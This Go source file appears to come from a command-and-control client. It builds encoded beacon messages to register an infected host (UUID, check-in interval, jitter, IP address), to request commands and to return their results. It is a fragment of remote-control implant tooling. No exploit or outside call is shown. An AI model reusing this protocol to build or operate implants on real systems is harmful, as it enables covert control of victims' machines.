package metcli

import (
	"strconv"
	"strings"

	"github.com/google/uuid"
)

// GenGetComPL generates the payload used to "get commands"
func GenGetComPL(m Metclient) string {
	uid := fetchUUID(m)
	compayload := encodePayload(uid, "D", "0", m.magicstring, m.magictermstr)
	return compayload
}

// genResPL generates the payload used to "send results"
func genResPL(res []string, m Metclient) string {
	resStr := strings.Join(res, "<||>")
	respayload := encodePayload(resStr, "E", "0", m.magicstring, m.magictermstr)
	return respayload
}

// genRegPL generates the payload used to "register" a new client
func genRegPL(m Metclient) string {
	uid := uuid.New().String()
	storeUUID(uid, m)
	hn := getIP()
	intrv := strconv.Itoa(m.interval)
	dlt := strconv.Itoa(m.delta)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ep := encodePayload(payload, "C", "0", m.magicstring, m.magictermstr)
	return ep
}
